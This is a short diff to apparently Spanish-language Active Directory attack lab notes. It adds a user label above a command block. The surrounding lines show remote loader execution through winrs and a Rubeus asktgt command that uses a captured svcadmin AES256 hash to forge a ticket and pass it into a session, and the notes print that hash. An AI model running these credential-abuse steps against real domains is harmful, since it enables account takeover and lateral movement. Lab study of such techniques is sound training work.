@@ -443,6 +443,7 @@ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.
 
 Obteniendo las credenciales de svcadmin *6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* , ahora con Rubeus en una nueva terminal como administrador  le pasaremos el hash *aes256* y se nos permitirá conectarnos vía winrs
 ```shell
+[student97]
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
